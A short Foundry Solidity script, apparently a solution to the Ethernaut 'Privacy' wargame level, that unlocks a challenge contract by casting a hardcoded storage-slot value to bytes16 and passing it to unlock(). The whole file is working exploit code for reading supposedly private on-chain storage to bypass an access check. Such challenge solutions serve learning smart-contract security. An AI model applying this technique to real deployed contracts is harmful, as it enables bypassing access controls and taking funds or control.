// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Privacy} from "../src/level12/Privacy.sol";
import "forge-std/console.sol";

contract level12Exploit is Script {
    Privacy privacy = Privacy(0x54234f2D7AEC9384AeD9E3Eaa30767a022571D2a);

    bytes32 data =
        0x85743f2fc1494ddacd2f09bd73da016993514a4095df221df260e45d58a8b13c;
    bytes16 pass = bytes16(data);

    function run() external {
        vm.startBroadcast();
        console.log("lock: ", privacy.locked());

        privacy.unlock(pass);
        console.log("lock: ", privacy.locked());
        vm.stopBroadcast();
    }
}
